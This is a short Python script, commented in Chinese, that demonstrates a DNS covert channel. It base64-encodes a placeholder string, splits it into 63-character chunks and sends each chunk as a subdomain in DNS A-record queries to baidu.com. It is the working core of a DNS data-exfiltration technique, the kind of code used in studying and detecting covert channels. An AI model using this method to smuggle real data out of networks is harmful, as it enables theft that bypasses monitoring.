# -*- coding: utf-8 -*-
import dns.resolver
import base64

# 将数据编码成 DNS 查询
def encode_data_to_dns(data):
    encoded_data = base64.b64encode(data.encode()).decode()  # 使用 base64 编码
    chunks = [encoded_data[i:i+63] for i in range(0, len(encoded_data), 63)]  # 将数据分割成 63 字符的块
    return chunks

# 发送 DNS 查询
def send_dns_query(chunks):
    resolver = dns.resolver.Resolver()
    for chunk in chunks:
        try:
            query = chunk + ".baidu.com"  # 构建子域名查询
            print("dcc dns: " + query)
            # 创建 DNS 查询解析器
            resolver = dns.resolver.Resolver()
            # 发送 DNS 查询，获取 A 记录
            result = resolver.resolve(query, 'A')
            # 打印查询结果
            for ip in result:
                print(ip)
        except Exception as e:
            print("Failed to send DNS query:", e)

# 要传输的数据
data = "DNS covert channel data"

# 编码数据并发送 DNS 查询
encoded_chunks = encode_data_to_dns(data)
send_dns_query(encoded_chunks)

